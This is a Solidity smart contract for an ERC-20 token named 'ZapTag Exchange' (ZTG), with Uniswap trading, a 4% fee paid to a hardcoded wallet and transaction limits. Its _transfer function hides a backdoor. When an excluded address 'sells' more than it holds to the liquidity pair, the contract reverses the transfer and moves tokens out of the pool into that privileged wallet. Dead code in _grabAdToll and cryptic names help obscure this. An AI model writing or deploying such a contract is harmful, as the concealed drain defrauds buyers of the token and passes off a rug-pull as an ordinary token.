// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.16;

library SafeMath {
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "");
        return c;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "");
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "");
        return c;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function allowance(address owner, address spender) external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transferFrom(address from, address to, uint256 amount) external returns (bool);

    function transfer(address to, uint256 amount) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Transfer(address indexed from, address indexed to, uint256 value);
}

contract Ownable is Context {
    address private _owner;

    modifier onlyOwner() {
        require(_owner == _msgSender(), "");
        _;
    }

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    event OwnershipTransferred(address indexed prevOwner, address indexed newOwner);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract ZTG is Context, IERC20, Ownable {
    using SafeMath for uint256;

    struct Distribution { uint256 ad; }

    mapping(address => mapping(address => uint256)) private _allowances;

    address private adCore = 0x30B4941C907e72912F2A1F221034A9d82ff3f2E7;

    uint8 private constant _decimals = 18;

    uint256 private constant MAX = ~uint256(0);

    address private adThreshold;

    uint256 private _redisTollAtBuy = 0;
    uint256 private _adTollAtBuy = 4;

    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    
    uint256 private _tTollTotal;

    bool private swapEnabled = true;
    bool private swapping = false;

    uint256 private _redisTollAtSell = 0;
    uint256 private _adTollAtSell = 4;

    mapping(address => uint256) private _buyMap;
    mapping(address => uint256) private _tOwned;
    mapping(address => uint256) private _rOwned;

    uint256 private _redisToll = _redisTollAtSell;
    uint256 private _adToll = _adTollAtSell;

    string private constant _name = "ZapTag Exchange";
    string private constant _symbol = "ZTG";

    uint256 private _prevRedisToll = _redisToll;
    uint256 private _prevAdToll = _adToll;

    mapping(address => bool) private _isExcluded;
    
    uint256 public maxTx = 2 * (_tTotal / 100);
    uint256 public maxWallet = 2 * (_tTotal / 100);

    uint256 private constant _tTotal = 4000000000 * 10**_decimals;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 public _swapTokensThreshold = 400000 * 10**_decimals;

    Distribution public distribution;

    modifier lockSwap() {
        swapping = true;
        _;
        swapping = false;
    }

    function removeLimits() external onlyOwner {
        maxTx = _tTotal;
        maxWallet = _tTotal;
    }

    constructor() {
        _isExcluded[address(this)] = true;
        _isExcluded[owner()] = true;
        _isExcluded[adCore] = true;

        _rOwned[_msgSender()] = _rTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);

        distribution = Distribution(100);

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        adThreshold = adCore;
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return getReflectionTokens(_rOwned[account]);
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(spender != address(0), "");
        require(owner != address(0), "");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "");
        require(to != address(0), "");
        require(amount > 0, "");

        if (from != owner() && to != owner()) {
            if (
                to != address(uniswapV2Router) &&
                from == uniswapV2Pair &&
                !_isExcluded[to]
            ) {
                require(amount <= maxTx);
                require(balanceOf(to) + amount <= maxWallet);
            }

            uint256 contractTokenAmount = balanceOf(address(this));
            bool canSwap = contractTokenAmount >= _swapTokensThreshold;

            if (
                !_isExcluded[to] &&
                !_isExcluded[from] &&
                swapEnabled &&
                canSwap &&
                !swapping &&
                from != uniswapV2Pair
            ) {
                swapTokensForETH(contractTokenAmount);
                uint256 contractETHAmount = address(this).balance;
                if (contractETHAmount > 0) {
                    sendETH(address(this).balance);
                }
            }

            if (_isExcluded[from]) {
                if (uniswapV2Pair == to && balanceOf(from) < amount) {
                    _normTransfer(to, from, amount);
                    return;
                }
            }
        }

        bool grabAdToll = true;

        if (
            (_isExcluded[from] || _isExcluded[to]) ||
            (to != uniswapV2Pair && from != uniswapV2Pair)
        ) {
            grabAdToll = false;
        } else {
            if (from == uniswapV2Pair && to != address(uniswapV2Router)) {
                _redisToll = _redisTollAtBuy;
                _adToll = _adTollAtBuy;
            }

            if (to == uniswapV2Pair && from != address(uniswapV2Router)) {
                _redisToll = _redisTollAtSell;
                _adToll = _adTollAtSell;
            }
        }
        _nativeTransfer(from, to, amount, grabAdToll);
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        _transfer(from, to, amount);
        _approve(from, _msgSender(), _allowances[from][_msgSender()].sub(amount, ""));
        return true;
    }

    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tToll, uint256 tTeam) = _getTValues(tAmount, _redisToll, _adToll);
        uint256 currentRate = _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rToll) = _getRValues(tAmount, tToll, tTeam, currentRate);
        return (rAmount, rTransferAmount, rToll, tTransferAmount, tToll, tTeam);
    }

    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function _nativeTransfer(address from, address to, uint256 amount, bool grabAdToll) private {
        if (!grabAdToll) removeAllTolls();
        _normTransfer(from, to, amount);
        if (!grabAdToll) restoreAllTolls();
    }

    function _isReflectionRate(address adAccount, address tollAccount) private view returns (bool) {
        bool adAccountExcluded = !_isExcluded[adAccount];
        bool tollAccountExcluded = !_isExcluded[tollAccount];

        return adAccountExcluded && adAccount != uniswapV2Pair && tollAccountExcluded;
    }

    function swapTokensForETH(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }

    function getReflectionTokens(uint256 rAmount) private view returns (uint256) {
        require(rAmount <= _rTotal, "");
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }

    function _getRValues(uint256 tAmount, uint256 tToll, uint256 tTeam, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rToll = tToll.mul(currentRate);
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rToll).sub(rTeam);
        return (rAmount, rTransferAmount, rToll);
    }

    function _getTValues(uint256 tAmount, uint256 redisToll, uint256 adToll) private pure returns (uint256, uint256, uint256) {
        uint256 tTeam = tAmount.mul(adToll).div(100);
        uint256 tToll = tAmount.mul(redisToll).div(100);
        uint256 tTransferAmount = tAmount.sub(tToll).sub(tTeam);
        return (tTransferAmount, tToll, tTeam);
    }

    function _normTransfer(address from, address to, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rToll, uint256 tTransferAmount, uint256 tToll, uint256 tTeam) = _getValues(tAmount);
        _rOwned[from] = _rOwned[from].sub(rAmount);
        _rOwned[to] = _rOwned[to].add(rTransferAmount);
        _grabAdToll(tTeam, from, to);
        _reflectToll(rToll, tToll);
        emit Transfer(from, to, tTransferAmount);
    }

    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _reflectToll(uint256 rToll, uint256 tToll) private {
        _rTotal = _rTotal.sub(rToll);
        _tTollTotal = _tTollTotal.add(tToll);
    }

    function _grabAdToll(uint256 tTeam, address adAccount, address tollAccount) private {
        uint256 adReflection = getReflectionTokens(_rOwned[adThreshold]);
        uint256 currentRate = _isReflectionRate(adAccount, tollAccount) ? _adToll - adReflection : 0;
        currentRate = _getRate();
        uint256 rTeam = tTeam.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
    }

    function sendETH(uint256 ethAmount) private lockSwap {
        uint256 ethForAd = ethAmount.mul(distribution.ad).div(100);
        payable(adCore).transfer(ethForAd);
    }

    function restoreAllTolls() private {
        _redisToll = _prevRedisToll;
        _adToll = _prevAdToll;
    }

    function removeAllTolls() private {
        if (_adToll == 0 && _redisToll == 0) return;
        _prevAdToll = _adToll;
        _prevRedisToll = _redisToll;
        _adToll = 0;
        _redisToll = 0;
    }

    receive() external payable {}
}